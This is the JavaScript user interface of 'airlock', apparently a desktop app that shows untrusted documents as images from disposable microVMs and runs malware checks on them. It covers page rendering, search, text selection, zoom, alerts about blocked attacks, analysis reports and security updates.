"use strict";
// airlock UI. Everything shown here comes from the Rust side: PNG pixels,
// numbers, and sanitised text — always inserted with textContent, never HTML.

const { invoke } = window.__TAURI__.core;
const $ = (id) => document.getElementById(id);

const PT_TO_PX = 96 / 72;
const ZOOMS = [0.5, 0.67, 0.75, 0.9, 1, 1.1, 1.25, 1.5, 1.75, 2, 2.5, 3];

const state = {
  pages: [],          // [{w, h, el, img, text, layer, key, url, textState}]
  zoom: 1,
  fitMode: true,      // keep fitting the width on resize / panel toggle
  hits: [],
  hitIndex: -1,
  queue: [],
  rendering: false,
  docOpen: false,
  observer: null,
  findings: null,
  pixelsOnly: false,  // no document text leaves the VM (enforced in Rust too)
};

// ---------------------------------------------------------------- helpers

function status(text, isError = false) {
  const s = $("status");
  s.textContent = text;
  s.classList.toggle("error", isError);
}

function busy(text) {
  $("busy").hidden = !text;
  $("busy-text").textContent = text || "";
}

function el(tag, cls, text) {
  const e = document.createElement(tag);
  if (cls) e.className = cls;
  if (text !== undefined) e.textContent = text;
  return e;
}

function renderDpi() {
  const dpi = 96 * state.zoom * (window.devicePixelRatio || 1);
  return Math.min(600, Math.max(20, Math.round(dpi / 24) * 24));
}

function currentPage() {
  const viewer = $("viewer");
  const mid = viewer.scrollTop + viewer.clientHeight / 3;
  let best = 0;
  for (let i = 0; i < state.pages.length; i++) {
    if (state.pages[i].el.offsetTop <= mid) best = i;
  }
  return best;
}

// ---------------------------------------------------------------- opening

async function openWith(promise, label) {
  busy(`Booting a disposable microVM for ${label}…`);
  status("Opening…");
  const t0 = performance.now();
  try {
    const r = await promise;
    // Older call sites return the info itself; open_many returns {info, elsewhere}.
    const info = r && "elsewhere" in r ? r.info : r;
    const more = r && r.elsewhere ? ` · ${r.elsewhere} more in new window${r.elsewhere > 1 ? "s" : ""} (one VM each)` : "";
    if (!info) { status(more ? more.slice(3) : "Ready"); return; }
    const sameFile = state.reopening;
    setupDocument(info);
    if (!sameFile || (!check.report && !check.running)) {
      clearCheck();
      if (autoCheckOn()) startCheck();
    } else showCheck();
    const secs = ((performance.now() - t0) / 1000).toFixed(1);
    status(`${info.pages.length} page(s) · VM ready in ${(info.ready_ms / 1000).toFixed(1)}s · opened in ${secs}s${more}`);
  } catch (e) {
    resetDocument();
    // Attacked while opening: the red alert, and the full check runs anyway.
    if (String(e).startsWith("the document attacked its VM")) {
      attackBlocked(e);
      $("seal").classList.remove("stopped");
      if (autoCheckOn()) startCheck();
      return;
    }
    status(`Could not open: ${e}`, true);
    // The file was read but cannot be shown: it can still be analyzed.
    const name = await invoke("chosen_name").catch(() => null);
    if (name) showUndisplayable(name, String(e));
  } finally {
    busy(null);
    state.reopening = false;
  }
}

// Back to the empty state (the previous document's VM is already gone).
function resetDocument() {
  for (const p of state.pages) if (p.url) URL.revokeObjectURL(p.url);
  if (state.observer) state.observer.disconnect();
  Object.assign(state, { pages: [], hits: [], hitIndex: -1, queue: [], findings: null, docOpen: false });
  $("pages").replaceChildren();
  clearCheck();
  for (const id of ["doc", "searchbox", "zoombox", "textbtn", "sheetbtn", "savewrap", "pixels", "analyze", "banner"]) $(id).hidden = true;
  $("empty").hidden = false;
  closePanel();
}

function showUndisplayable(name, why) {
  const body = openPanel("Cannot display");
  const go = el("button", "primary", "Analyze anyway");
  go.onclick = () => analyze(name);
  body.replaceChildren(
    el("p", "", `${name}: ${why}.`),
    el("p", "note", "Analysis does not need anything visible: it detonates the file in a separate microVM wired to a fake internet and inspects its macros and structure."),
    go,
  );
}

function openDialog() {
  openWith(invoke("pick_and_open"), "the document");
}

function openPaths(paths) {
  const name = state.docOpen ? "the documents" : paths[0].split(/[\\/]/).pop();
  openWith(invoke("open_paths", { paths }), name);
}

// ---------------------------------------------------------------- saving

function toggleSaveMenu(open) {
  const m = $("savemenu");
  m.hidden = open === undefined ? !m.hidden : !open;
  $("savebtn").setAttribute("aria-expanded", String(!m.hidden));
}

async function saveSafeCopy() {
  if (!state.docOpen) return;
  toggleSaveMenu(false);
  const stop = await window.__TAURI__.event.listen("export-progress", (e) => {
    const [i, n] = e.payload;
    status(`Saving safe copy: page ${i} of ${n}…`);
  });
  try {
    const path = await invoke("save_safe_copy");
    status(path ? `Saved a safe copy (pixels only) to ${path}` : "Ready");
  } catch (e) {
    status(`Could not save: ${e}`, true);
  } finally {
    stop();
  }
}

// Prints the pixels: every page is drawn once more at print resolution.
async function printDocument() {
  if (!state.docOpen) return;
  toggleSaveMenu(false);
  const out = $("printout");
  const urls = [];
  try {
    for (let i = 0; i < state.pages.length; i++) {
      status(`Preparing to print: page ${i + 1} of ${state.pages.length}…`);
      const buf = await invoke("render_page", { page: i, dpi: 150 });
      const url = URL.createObjectURL(new Blob([buf], { type: "image/png" }));
      urls.push(url);
      const img = el("img");
      img.src = url;
      out.append(img);
    }
    await Promise.all([...out.querySelectorAll("img")].map((img) => img.decode().catch(() => {})));
    window.print();
    status("Ready");
  } catch (e) {
    status(`Could not print: ${e}`, true);
  } finally {
    // print() returns once the dialog is done with the pages.
    setTimeout(() => { out.replaceChildren(); urls.forEach((u) => URL.revokeObjectURL(u)); }, 1000);
  }
}

async function saveReport() {
  try {
    const path = await invoke("save_report");
    if (path) status(`Saved the report to ${path}`);
  } catch (e) {
    status(`Could not save the report: ${e}`, true);
  }
}

function openPath(path) {
  const name = path.split(/[\\/]/).pop();
  openWith(invoke("open_path", { path }), name);
}

function setupDocument(info) {
  for (const p of state.pages) if (p.url) URL.revokeObjectURL(p.url);
  state.pages = [];
  state.hits = [];
  state.hitIndex = -1;
  state.queue = [];
  state.findings = null;
  state.aiHints = null;
  state.docOpen = true;
  $("banner").hidden = true;
  $("qcount").textContent = "";
  closePanel();

  $("docname").textContent = info.name;
  $("sheetbtn").hidden = !info.spreadsheet;
  $("seal").classList.remove("stopped");
  $("seal").querySelector(".label").textContent = "Sealed · microVM · no network";
  for (const id of ["doc", "searchbox", "zoombox", "savewrap", "pixels", "analyze"]) $(id).hidden = false;
  $("textbtn").hidden = state.pixelsOnly;
  $("empty").hidden = true;
  $("analyze").disabled = false;

  const container = $("pages");
  container.replaceChildren();
  if (state.observer) state.observer.disconnect();
  state.observer = new IntersectionObserver(onVisible, { root: $("viewer"), rootMargin: "600px 0px" });

  info.pages.forEach(([w, h], i) => {
    const pageEl = el("div", "page loading");
    const img = el("img");
    img.alt = `Page ${i + 1}`;
    const text = el("div", "text");
    const layer = el("div", "layer");
    pageEl.append(img, text, layer, el("span", "num", String(i + 1)));
    pageEl.dataset.index = String(i);
    container.append(pageEl);
    state.pages.push({ w, h, el: pageEl, img, text, layer, key: null, url: null, visible: false, textState: null });
    state.observer.observe(pageEl);
  });
  fitWidth();
  $("viewer").scrollTop = 0;
}

// ---------------------------------------------------------------- rendering

function layout() {
  const scale = state.zoom * PT_TO_PX;
  $("pages").style.setProperty("--s", String(scale));
  for (const p of state.pages) {
    p.el.style.width = `${Math.round(p.w * scale)}px`;
    p.el.style.height = `${Math.round(p.h * scale)}px`;
  }
  $("zlabel").textContent = `${Math.round(state.zoom * 100)}%`;
  drawHighlights();
  for (const p of state.pages) if (p.visible) enqueue(state.pages.indexOf(p));
}

function onVisible(entries) {
  for (const e of entries) {
    const i = Number(e.target.dataset.index);
    state.pages[i].visible = e.isIntersecting;
    if (e.isIntersecting) enqueue(i);
  }
}

function enqueue(i) {
  if (!state.queue.includes(i)) state.queue.push(i);
  pump();
}

async function pump() {
  if (state.rendering) return;
  state.rendering = true;
  try {
    while (state.queue.length) {
      // Nearest-to-view first.
      const cur = currentPage();
      state.queue.sort((a, b) => Math.abs(a - cur) - Math.abs(b - cur));
      const i = state.queue.shift();
      const p = state.pages[i];
      const dpi = renderDpi();
      if (!p || !p.visible || p.key === dpi) continue;
      try {
        const buf = await invoke("render_page", { page: i, dpi });
        const url = URL.createObjectURL(new Blob([buf], { type: "image/png" }));
        if (p.url) URL.revokeObjectURL(p.url);
        p.url = url;
        p.img.src = url;
        p.key = dpi;
        p.el.classList.remove("loading");
      } catch (e) {
        if (!vmStopped(e)) status(`Page ${i + 1}: ${e}`, true);
        break;
      }
      if (!p.textState && !state.pixelsOnly) await loadTextLayer(p, i);
    }
  } finally {
    state.rendering = false;
  }
  checkViewingFindings();
}

// ---------------------------------------------------------------- text layer
// Invisible text over the page image so it can be selected and copied like
// in any PDF viewer. Lines and boxes come from the VM; the text is the same
// sanitised text as the Text panel and is inserted with textContent only.

async function loadTextLayer(p, i) {
  p.textState = "loading";
  let lines;
  try {
    lines = await invoke("page_lines", { page: i });
  } catch (e) {
    p.textState = null;
    if (!vmStopped(e)) status(`Page ${i + 1} text: ${e}`, true);
    return;
  }
  const spans = [];
  for (const { rect: [x0, y0, x1, y1], text } of lines) {
    const w = x1 - x0, h = y1 - y0;
    // Vertical / rotated lines would need rotation; leave them out.
    if (!text || (h > w * 1.5 && [...text].length > 1)) continue;
    const span = el("span", "", text);
    span.style.setProperty("--x", String(x0));
    span.style.setProperty("--y", String(y0));
    span.style.setProperty("--h", String(h));
    spans.push([span, w]);
  }
  p.text.replaceChildren(...spans.flatMap(([span]) => [span, document.createElement("br")]));
  // Stretch each line to its real width (the page's fonts are not ours).
  // The ratio does not depend on zoom, so it is measured once.
  const scale = state.zoom * PT_TO_PX;
  const widths = spans.map(([span]) => span.offsetWidth);
  spans.forEach(([span, w], k) => {
    if (widths[k] > 0) span.style.transform = `scaleX(${(w * scale) / widths[k]})`;
  });
  p.textState = "ready";
}

async function setPixelsOnly(on, remember = true) {
  await invoke("set_pixels_only", { on });
  state.pixelsOnly = on;
  if (remember) try { localStorage.setItem("airlock.pixelsOnly", on ? "1" : "0"); } catch {}
  $("pixels").setAttribute("aria-pressed", String(on));
  $("textbtn").hidden = on || !state.docOpen;
  if (on) {
    getSelection()?.removeAllRanges();
    for (const p of state.pages) { p.text.replaceChildren(); p.textState = null; }
    if ($("panel-title").textContent.startsWith("Text")) closePanel();
    status("Pixels only: no document text leaves the VM");
  } else {
    for (const [i, p] of state.pages.entries()) if (p.key && !p.textState) await loadTextLayer(p, i);
    status("Text selection on");
  }
}

// Copy plain text only: the layer is transparent, so its HTML would paste
// as invisible text into rich editors.
document.addEventListener("copy", (e) => {
  const sel = getSelection();
  if (!sel || sel.isCollapsed || !$("pages").contains(sel.anchorNode)) return;
  e.clipboardData.setData("text/plain", sel.toString());
  e.preventDefault();
});

async function checkViewingFindings() {
  if (!state.docOpen) return;
  const report = await invoke("viewing_findings").catch(() => null);
  if (!report) return;
  state.findings = report;
  const n = report.findings.length;
  $("banner-text").textContent = `While rendering, this document triggered ${n} blocked action(s) inside the VM.`;
  $("banner").hidden = false;
}

// ---------------------------------------------------------------- zoom

function setZoom(z, anchorPage) {
  const keep = anchorPage ?? currentPage();
  state.zoom = Math.min(3, Math.max(0.25, z));
  layout();
  const p = state.pages[keep];
  if (p) $("viewer").scrollTop = p.el.offsetTop - 12;
}

function stepZoom(dir) {
  state.fitMode = false;
  const z = state.zoom;
  const next = dir > 0 ? ZOOMS.find((v) => v > z + 0.001) : [...ZOOMS].reverse().find((v) => v < z - 0.001);
  setZoom(next ?? z);
}

function fitWidth() {
  state.fitMode = true;
  if (!state.pages.length) return;
  const maxW = Math.max(...state.pages.map((p) => p.w));
  const avail = $("viewer").clientWidth - 48;
  setZoom(Math.min(2, avail / (maxW * PT_TO_PX)), currentPage());
}

// ---------------------------------------------------------------- search

async function runSearch() {
  const q = $("q").value.trim();
  if (!state.docOpen) return;
  if (!q) {
    state.hits = [];
    state.hitIndex = -1;
    $("qcount").textContent = "";
    drawHighlights();
    return;
  }
  status(`Searching inside the VM for “${q}”…`);
  try {
    state.hits = await invoke("search", { query: q });
    state.hitIndex = state.hits.length ? 0 : -1;
    status(`${state.hits.length} match(es) for “${q}”`);
    drawHighlights();
    showHit();
  } catch (e) {
    if (!vmStopped(e)) status(`Search failed: ${e}`, true);
  }
}

// The document's VM is gone (it stopped, or was shut down as hostile):
// say so plainly and offer a fresh one. Why is in ~/.local/state/airlock/app.log.
// The tripwire: the document tried to run a program, use the network or
// attack the system from inside its VM, which was destroyed at once.
function attackBlocked(e) {
  const msg = String(e);
  if (!msg.startsWith("the document attacked its VM")) return false;
  check.attacked = true;
  check.attackMsg = msg;
  showCheck();
  const what = msg.replace(/^the document attacked its VM: /, "").replace(/ \(blocked; the VM was destroyed at once\)$/, "");
  status("Attack blocked: the document's VM was destroyed", true);
  $("seal").classList.add("stopped");
  $("seal").querySelector(".label").textContent = "VM destroyed · attack blocked";
  const body = openPanel("Attack blocked");
  const v = el("div", "verdict malicious");
  v.append(el("div", "label", "ATTACK BLOCKED"), el("h3", "", "This document tried to attack your computer"));
  const advice = el("div", "advice");
  advice.append(el("strong", "", "What happened"), el("p", "", "While it was being shown, the document tried to do something no document needs to do. airlock blocked it and destroyed the document's VM at once, so it got no second try. Nothing reached your computer."));
  advice.append(el("strong", "", "What to do"), el("p", "", "Do not open the original in any other program. Delete it, and if it came by email, report it as phishing. The pages already shown are only pictures and are safe to look at."));
  v.append(advice);
  const tech = el("details", "");
  tech.append(el("summary", "", "Technical details"), el("pre", "", what));
  body.replaceChildren(v, tech);
  const go = el("button", "", "Full analysis…");
  go.onclick = () => showAnalysis();
  body.append(go);
  return true;
}

function vmStopped(e) {
  if (attackBlocked(e)) return true;
  // After the tripwire, the other requests in flight fail too: already explained.
  if (check.attacked) return true;
  const msg = String(e);
  const stopped = msg.startsWith("the document's VM stopped");
  const hostile = msg.startsWith("protocol violation");
  if (!stopped && !hostile) return false;
  status(hostile ? "The document's VM broke airlock's rules and was shut down" : "The document's VM stopped", true);
  $("seal").classList.add("stopped");
  $("seal").querySelector(".label").textContent = "VM stopped · nothing is running";
  notify(
    hostile ? "VM shut down for safety" : "This document's VM stopped",
    hostile
      ? "The VM showing this document broke airlock's rules (what an exploit looks like from outside), so it was destroyed. Run Analyze for details. Reopening starts a new, clean VM."
      : "The disposable VM showing this document is no longer running, so pages, search and text are unavailable. Reopening starts a new one in a second.",
    [["Reopen", reopenDocument], ["Close", hideToast]],
  );
  return true;
}

function reopenDocument() {
  hideToast();
  state.reopening = true;
  return openWith(invoke("reopen"), $("docname").textContent || "the document");
}

function drawHighlights() {
  const scale = state.zoom * PT_TO_PX;
  for (const p of state.pages) p.layer.replaceChildren();
  state.hits.forEach((h, idx) => {
    const p = state.pages[h.page];
    if (!p) return;
    const [x0, y0, x1, y1] = h.rect;
    const d = el("div", idx === state.hitIndex ? "hl current" : "hl");
    d.style.left = `${x0 * scale - 1}px`;
    d.style.top = `${y0 * scale - 1}px`;
    d.style.width = `${(x1 - x0) * scale + 2}px`;
    d.style.height = `${(y1 - y0) * scale + 2}px`;
    p.layer.append(d);
  });
  $("qcount").textContent = state.hits.length ? `${state.hitIndex + 1} / ${state.hits.length}` : ($("q").value.trim() ? "0" : "");
}

function showHit() {
  const h = state.hits[state.hitIndex];
  if (!h) return;
  drawHighlights();
  const p = state.pages[h.page];
  const scale = state.zoom * PT_TO_PX;
  const viewer = $("viewer");
  viewer.scrollTop = p.el.offsetTop + h.rect[1] * scale - viewer.clientHeight / 3;
}

function stepHit(dir) {
  if (!state.hits.length) return runSearch();
  state.hitIndex = (state.hitIndex + dir + state.hits.length) % state.hits.length;
  showHit();
}

// ---------------------------------------------------------------- panels

function openPanel(title) {
  $("panel-title").textContent = title;
  $("panel").hidden = false;
  if (state.fitMode) fitWidth();
  return $("panel-body");
}

function closePanel() {
  $("panel").hidden = true;
  $("panel-body").replaceChildren();
  if (state.fitMode && state.docOpen) fitWidth();
}

async function showText() {
  const page = currentPage();
  const body = openPanel(`Text · page ${page + 1}`);
  body.replaceChildren(el("p", "note", "Extracting inside the VM…"));
  try {
    const text = await invoke("page_text", { page });
    const copy = el("button", "", "Copy");
    const row = el("div", "row");
    row.append(copy, el("span", "note", "Extracted inside the VM; control and bidi-override characters removed."));
    const pre = el("pre", "", text || "(no text on this page — it may be a scanned image)");
    copy.onclick = async () => {
      try { await navigator.clipboard.writeText(text); copy.textContent = "Copied"; }
      catch { const r = document.createRange(); r.selectNodeContents(pre); getSelection().removeAllRanges(); getSelection().addRange(r); copy.textContent = "Selected — press Ctrl+C"; }
    };
    // Optional: hints that the text came from an AI chat tool (off by default).
    const ai = el("label", "check");
    const box = el("input");
    box.type = "checkbox";
    box.checked = pref("airlock.aiHints", "0") === "1";
    ai.append(box, el("span", "", "Check for AI-written text"));
    ai.title = "Looks for characters and leftovers that AI chat tools put into pasted text, and stock phrasing. Hints, not proof.";
    const aiOut = el("div", "ai-hints");
    box.onchange = () => { setPref("airlock.aiHints", box.checked ? "1" : "0"); showAiHints(aiOut, box.checked); };
    body.replaceChildren(row, ai, aiOut, pre);
    showAiHints(aiOut, box.checked);
  } catch (e) {
    body.replaceChildren(el("p", "note", `Could not extract text: ${e}`));
  }
}

// One check per opened document, cached; shown in the Text panel.
async function showAiHints(out, on) {
  if (!on) { out.replaceChildren(); return; }
  out.replaceChildren(el("p", "note", "Checking the document's text inside the VM…"));
  try {
    if (!state.aiHints) state.aiHints = await invoke("ai_hints");
    const h = state.aiHints;
    const label = { strong: "Strong signs of AI-written text", some: "Some signs of AI-written text", none: "No clear signs of AI-written text" }[h.level];
    const card = el("div", `ai-card ${h.level}`);
    card.append(el("strong", "", label), el("p", "", h.summary));
    if (h.signals.length) {
      const ul = el("ul", "");
      for (const s of h.signals) {
        const li = el("li", "");
        li.append(el("span", `ai-tag ${s.strength}`, s.strength), el("b", "", ` ${s.title}: `), document.createTextNode(s.detail));
        ul.append(li);
      }
      card.append(ul);
    }
    card.append(el("p", "note", `Checked ${h.words} words on the first pages.`));
    out.replaceChildren(card);
  } catch (e) {
    out.replaceChildren(el("p", "note", `Could not check: ${e}`));
  }
}

// Plain language first (title, why it matters); the evidence, who saw it
// and the ATT&CK technique are one click away under each finding.
function renderReport(body, report, title) {
  const v = report.verdict;
  const cls = v.startsWith("MALICIOUS") || v.startsWith("LIKELY") ? "malicious" : v.startsWith("SUSPICIOUS") ? "suspicious" : "clean";
  const box = el("div", `verdict ${cls}`);
  box.append(el("div", "label", v), el("h3", "", report.headline || v));
  const advice = el("div", "advice");
  advice.append(el("strong", "", "What to do"), el("p", "", report.advice || report.summary));
  box.append(advice);
  const nodes = [box];
  if (title) nodes.push(el("p", "note", title));

  const important = report.findings.filter((f) => f.severity !== "info");
  const notes = report.findings.filter((f) => f.severity === "info");
  if (important.length) {
    const kinds = (s) => new Set(important.filter((f) => f.severity === s).map((f) => f.title + f.source)).size;
    const counts = ["high", "medium", "low"].map((s) => [s, kinds(s)]).filter(([, n]) => n);
    const row = el("div", "counts");
    for (const [s, n] of counts) row.append(el("span", `sev ${s}`, `${n} ${s === "medium" ? "medium" : s}`));
    nodes.push(el("h4", "section", "What we found"), row);
  }
  // One card per kind of finding; every piece of evidence inside it.
  const groups = [];
  for (const f of important) {
    const g = groups.find((x) => x.f.title === f.title && x.f.severity === f.severity && x.f.source === f.source);
    if (g) g.all.push(f); else groups.push({ f, all: [f] });
  }
  for (const { f, all } of groups) {
    const card = el("div", `finding ${f.severity}`);
    const head = el("div", "f-head");
    head.append(el("span", `sev ${f.severity}`, f.severity === "medium" ? "med" : f.severity), el("span", "f-title", f.title || f.what));
    if (all.length > 1) head.append(el("span", "f-count", `×${all.length}`));
    card.append(head);
    if (f.explain) card.append(el("p", "f-explain", f.explain));
    const more = el("details", "tech");
    more.append(el("summary", "", "Technical details"));
    const dl = el("dl");
    const row = (k, val) => { if (val && val !== "-") dl.append(el("dt", "", k), el("dd", "", val)); };
    all.forEach((e, i) => row(i ? "" : "Evidence", e.what));
    row("Seen by", f.seen_by);
    row("ATT&CK", f.attack);
    more.append(dl);
    card.append(more);
    nodes.push(card);
  }
  if (notes.length) {
    const d = el("details", "notes");
    d.append(el("summary", "", `Also noted · ${notes.length} harmless on ${notes.length > 1 ? "their" : "its"} own`));
    const ul = el("ul");
    for (const f of notes) {
      const li = el("li");
      li.append(el("strong", "", f.title || ""), el("span", "", ` ${f.what}`));
      ul.append(li);
    }
    d.append(ul);
    nodes.push(d);
  }
  if (!report.findings.length) nodes.push(el("p", "note", "No findings."));
  body.replaceChildren(...nodes);
}

// The malware check (the same one whether automatic or from Analyze): one
// run per opened file, shared by the badge, the Analyze button and the panel.
const check = { gen: 0, running: null, report: null, error: null, attacked: false };

function autoCheckOn() { return pref("airlock.autoCheck", "1") === "1"; }

function verdictClass(v) {
  return /MALICIOUS/.test(v) ? "malicious" : /SUSPICIOUS/.test(v) ? "suspicious" : "clean";
}

function showCheck() {
  const b = $("check");
  const [cls, label, title] = check.attacked
    ? ["malicious", "Attack blocked", "This document tried to attack your computer while it was shown; its VM was destroyed at once. Click for details."]
    : check.running
    ? ["checking", "Checking…", "Checking this file for malware in two separate microVMs (one wired to a fake internet). Keep reading meanwhile. Click to watch."]
    : check.report
      ? [verdictClass(check.report.verdict), { malicious: /LIKELY/.test(check.report.verdict) ? "Likely malicious" : "Malicious", suspicious: "Suspicious", clean: "No threats found" }[verdictClass(check.report.verdict)], `${check.report.headline || check.report.verdict}. Click for the full report.`]
      : check.error
        ? ["failed", "Check failed", `The malware check could not finish: ${check.error}. Click to try again.`]
        : [null];
  b.hidden = !cls || !state.docOpen;
  if (!cls) return;
  b.className = `check ${cls}`;
  b.querySelector(".label").textContent = label;
  b.title = title;
  b.setAttribute("aria-label", `Malware check: ${label}`);
}

function clearCheck() {
  Object.assign(check, { gen: check.gen + 1, running: null, report: null, error: null, attacked: false });
  showCheck();
}

function startCheck() {
  const gen = ++check.gen;
  Object.assign(check, { report: null, error: null });
  const p = invoke("analyze").then(
    (r) => {
      if (gen !== check.gen) return r;
      check.report = r;
      return r;
    },
    (e) => {
      if (gen === check.gen) check.error = String(e);
      throw e;
    },
  ).finally(() => {
    if (gen !== check.gen) return;
    check.running = null;
    showCheck();
    // Something found: show it without waiting for a click (unless the
    // analysis panel is already open and waiting for this result).
    if (check.report && verdictClass(check.report.verdict) !== "clean" && !(!$("panel").hidden && $("panel-title").textContent.startsWith("Analysis"))) showAnalysis();
  });
  check.running = p;
  showCheck();
  return p;
}

// The report panel: the finished check, or a spinner until it finishes.
async function showAnalysis(name, again = false) {
  const title = typeof name === "string" ? `Analysis · ${name}` : "Analysis";
  const body = openPanel(title);
  if (again || (!check.report && !check.running)) startCheck();
  if (check.running) {
    const wait = el("div", "row");
    wait.append(el("div", "spinner"), el("span", "note", "Detonating in a separate microVM wired to a fake internet, then examining its disk in a second VM. You can keep reading meanwhile."));
    body.replaceChildren(wait);
    status("Checking for malware in separate microVMs…");
    try { await check.running; } catch {}
    if ($("panel-title").textContent !== title || body.firstChild !== wait) return;
  }
  if (check.report) {
    const report = check.report;
    renderReport(body, report, `${report.document} · analyzed in ${report.seconds.toFixed(1)}s`);
    const save = el("button", "", "Save report…");
    save.title = "Save as text (or .json for tools)";
    save.onclick = saveReport;
    const again = el("button", "", "Check again");
    again.title = "Run the whole analysis again in new microVMs";
    again.onclick = () => showAnalysis(name, true);
    const row = el("div", "row");
    row.append(save, again);
    body.append(row);
    status(`Analysis: ${report.verdict}`);
  } else {
    const retry = el("button", "", "Try again");
    retry.onclick = () => showAnalysis(name, true);
    body.replaceChildren(el("p", "note", `Analysis failed: ${check.error}`), retry);
    status(`Analysis failed: ${check.error}`, true);
  }
}

function analyze(name) {
  return showAnalysis(name);
}

$("check").onclick = () => (check.attacked ? attackBlocked(check.attackMsg) : showAnalysis());

// ---------------------------------------------------------------- wiring

$("open").onclick = openDialog;
$("zin").onclick = () => stepZoom(1);
$("zout").onclick = () => stepZoom(-1);
$("zfit").onclick = fitWidth;
$("textbtn").onclick = showText;
$("savebtn").onclick = (e) => { e.stopPropagation(); toggleSaveMenu(); };
$("safecopy").onclick = saveSafeCopy;
$("print").onclick = printDocument;
document.addEventListener("click", (e) => { if (!$("savewrap").contains(e.target)) toggleSaveMenu(false); });
$("pixels").onclick = () => setPixelsOnly(!state.pixelsOnly);
$("analyze").onclick = analyze;
$("panel-close").onclick = closePanel;
$("qnext").onclick = () => stepHit(1);
$("qprev").onclick = () => stepHit(-1);
$("banner-more").onclick = () => state.findings && renderReport(openPanel("Blocked while viewing"), state.findings);

let searchTimer = null;
$("q").addEventListener("input", () => {
  clearTimeout(searchTimer);
  searchTimer = setTimeout(runSearch, 300);
});
$("q").addEventListener("keydown", (e) => {
  if (e.key === "Enter") { e.preventDefault(); stepHit(e.shiftKey ? -1 : 1); }
  if (e.key === "Escape") { $("q").value = ""; runSearch(); $("q").blur(); }
});

document.addEventListener("keydown", (e) => {
  const mod = e.ctrlKey || e.metaKey;
  if (mod && e.key.toLowerCase() === "o") { e.preventDefault(); openDialog(); return; }
  if (!state.docOpen) return;
  if (mod && e.key.toLowerCase() === "f") { e.preventDefault(); $("q").focus(); $("q").select(); return; }
  if (mod && e.key.toLowerCase() === "s") { e.preventDefault(); saveSafeCopy(); return; }
  if (mod && e.key.toLowerCase() === "p") { e.preventDefault(); printDocument(); return; }
  if (e.target.tagName === "INPUT") return;
  if (e.key === "+" || e.key === "=") stepZoom(1);
  else if (e.key === "-") stepZoom(-1);
  else if (e.key === "Escape") { toggleSaveMenu(false); closePanel(); }
});

let resizeTimer = null;
window.addEventListener("resize", () => {
  clearTimeout(resizeTimer);
  resizeTimer = setTimeout(() => state.docOpen && (state.fitMode ? fitWidth() : layout()), 150);
});

// Drag & drop: Tauri hands us the *path*; the bytes are read by Rust only.
window.__TAURI__.webview.getCurrentWebview().onDragDropEvent((event) => {
  const t = event.payload.type;
  $("viewer").classList.toggle("drop", t === "over" || t === "enter");
  if (t === "drop" && event.payload.paths.length) openPaths(event.payload.paths);
});

// ---------------------------------------------------------------- updates
// The VM's renderers, kernel and Firecracker are rebuilt from the source
// checkout by scripts/update.sh (verified downloads, regression suite,
// automatic restore on failure). Checked at most once a day.

const updates = { status: null, running: false, log: [], restart: false };

function pref(key, fallback) {
  try { return localStorage.getItem(key) ?? fallback; } catch { return fallback; }
}
function setPref(key, value) {
  try { localStorage.setItem(key, value); } catch {}
}

function describeChanges(st, max) {
  const list = st.changes.slice(0, max);
  const more = st.changes.length - list.length + Math.max(0, st.packages - st.changes.filter((c) => !/^(Guest kernel|Firecracker|Alpine base) /.test(c)).length);
  return { list, more };
}

function noteStatus(st) {
  updates.status = st;
  $("updates-dot").hidden = !(st && st.available);
}

async function checkUpdates(force) {
  const st = await invoke("update_status", { force });
  noteStatus(st);
  return st;
}

// A small notice in the corner: title, text, [label, action] buttons.
function notify(title, text, actions) {
  $("toast-title").textContent = title;
  $("toast-text").textContent = text;
  $("toast-actions").replaceChildren(...actions.map(([label, fn], i) => {
    const b = el("button", i === 0 && actions.length > 1 ? "primary" : "", label);
    b.onclick = fn;
    return b;
  }));
  $("toast").hidden = false;
}

function changeSummary(st) {
  const { list, more } = describeChanges(st, 2);
  return list.join(", ") + (more > 0 ? ` and ${more} more` : "");
}

function showToast(st) {
  notify("Security updates for airlock", `${changeSummary(st)}. Installing them takes about two minutes; you can keep reading.`, [
    ["Update now", () => runUpdate()],
    ["Details", showUpdates],
    ["Later", () => { hideToast(); setPref("airlock.updateSnooze", String(Date.now() + 86_400_000)); }],
  ]);
}

function hideToast() { $("toast").hidden = true; }

function renderUpdates(body) {
  const st = updates.status;
  const nodes = [];
  if (!st || !st.supported) {
    nodes.push(el("p", "", "This copy of airlock has no update kit."),
      el("p", "note", "Install it with scripts/install.sh (which adds the kit), or set AIRLOCK_SOURCE to an airlock source folder."));
    body.replaceChildren(...nodes);
    return;
  }
  if (st.error) nodes.push(el("p", "note", `Last check failed: ${st.error}`));
  else if (st.available) {
    nodes.push(el("p", "", "Security updates are available:"));
    const ul = el("ul", "changes");
    for (const c of st.changes) ul.append(el("li", "", c));
    if (st.packages > st.changes.length) ul.append(el("li", "", `… ${st.packages} packages in total`));
    nodes.push(ul);
  } else nodes.push(el("p", "", "Everything is up to date."));
  const when = st.checked ? new Date(st.checked * 1000).toLocaleString() : "never";
  nodes.push(el("p", "note", `Last checked: ${when} · VM image built ${st.image_age_days} day(s) ago.`));

  const row = el("div", "row");
  const check = el("button", "", "Check now");
  const go = el("button", "primary", updates.running ? "Updating…" : "Update now");
  go.disabled = updates.running;
  check.disabled = updates.running;
  check.onclick = async () => {
    check.disabled = true; check.textContent = "Checking…";
    try { await checkUpdates(true); } catch (e) { status(`Update check failed: ${e}`, true); }
    renderUpdates(body);
  };
  go.onclick = () => runUpdate(body);
  row.append(go, check);
  nodes.push(row, el("p", "note", "Downloads are verified (kernel.org signatures, published checksums). The full test suite must pass before the new version is used; otherwise the current one stays."));

  const toggle = (key, text, onChange) => {
    const label = el("label", "check");
    const box = el("input");
    box.type = "checkbox";
    box.checked = pref(key, "1") === "1";
    box.onchange = () => { setPref(key, box.checked ? "1" : "0"); onChange?.(box.checked); };
    label.append(box, document.createTextNode(text));
    return [label, box];
  };
  const [checkLabel] = toggle("airlock.autoUpdateCheck", "Check for updates automatically (once a day: kernel.org, GitHub, Alpine)", () => renderUpdates(body));
  const [installLabel, installBox] = toggle("airlock.autoInstall", "Install security updates automatically (in the background; you are told afterwards)");
  installBox.disabled = pref("airlock.autoUpdateCheck", "1") !== "1";
  nodes.push(checkLabel, installLabel);

  if (updates.log.length) {
    const ul = el("ul", "progress");
    for (const l of updates.log) ul.append(el("li", "", l));
    nodes.push(ul);
  }
  if (updates.restart) {
    const r = el("button", "primary", "Restart airlock");
    r.onclick = () => invoke("restart_app");
    nodes.push(el("p", "", "airlock itself was updated too. Documents opened from now on already use the new VM; restart to use the new app."), r);
  }
  body.replaceChildren(...nodes);
}

function showUpdates() {
  hideToast();
  renderUpdates(openPanel("Updates"));
}

